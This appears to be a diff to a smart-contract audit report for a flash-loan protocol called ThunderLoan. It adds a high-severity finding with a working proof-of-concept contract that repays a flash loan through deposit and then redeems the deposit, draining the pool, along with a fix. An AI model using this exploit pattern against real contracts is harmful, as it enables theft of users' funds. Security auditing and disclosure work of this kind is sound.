@@ -71,6 +71,116 @@ However, the `deposit` function updates this rate without collecting any fees!
 
 ```
 
+
+### [H-2] By calling a flashloan and then ThunderLoan::deposit instead of ThunderLoan::repay users can steal all funds from the protocol
+
+**Description:** By calling the deposit function to repay a loan, an attacker can meet the flashloan's repayment check, while being allowed to later redeem their deposited tokens, stealing the loan funds.
+
+**Impact:** This exploit drains the liquidity pool for the flash loaned token, breaking internal accounting and stealing all funds.
+
+**Proof of Concept:**
+
+1. Attacker executes a `flashloan`
+2. Borrowed funds are deposited into `ThunderLoan` via a malicious contract's `executeOperation` function
+3. `Flashloan` check passes due to check vs starting AssetToken Balance being equal to the post deposit amount
+4. Attacker is able to call `redeem` on `ThunderLoan` to withdraw the deposited tokens after the flash loan as resolved.
+
+Add the following to ThunderLoanTest.t.sol and run `forge test --mt testUseDepositInsteadOfRepayToStealFunds`
+
+
+<summary>Proof of Code</summary>
+
+``` solidity 
+    function testUseDeposit() public setAllowedToken hasDeposits {
+        // instead of repaying use deposit 
+        
+        uint256 amount = 50e18;
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amount);
+        
+        
+        vm.startPrank(user);
+        tokenA.mint(address(dor), fee);
+        
+        thunderLoan.flashloan(address(dor), tokenA, amount, "");
+        
+        dor.redeemMoney();
+        
+        vm.stopPrank();
+
+        assert(tokenA.balanceOf(address(dor)) > fee);
+    }
+
+
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    IERC20 s_token;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns (bool) {
+
+        s_token = IERC20(token);
+
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+
+        s_token.approve(address(thunderLoan), amount + fee);
+        
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        
+        return true;
+    }
+
+    function redeemMoney() public {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amount);
+    }    
+}
+
+```
+
+**Recommended Mitigation:** ThunderLoan could prevent deposits while an AssetToken is currently flash loaning.
+
+
+``` diff
+    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
++      if (s_currentlyFlashLoaning[token]) {
++          revert ThunderLoan__CurrentlyFlashLoaning();
++      }
+        AssetToken assetToken = s_tokenToAssetToken[token];
+        uint256 exchangeRate = assetToken.getExchangeRate();
+        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
+        emit Deposit(msg.sender, token, amount);
+        assetToken.mint(msg.sender, mintAmount);
+
+        uint256 calculatedFee = getCalculatedFee(token, amount);
+        assetToken.updateExchangeRate(calculatedFee);
+
+        token.safeTransferFrom(msg.sender, address(assetToken), amount);
+    }
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks
 
 **Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees.
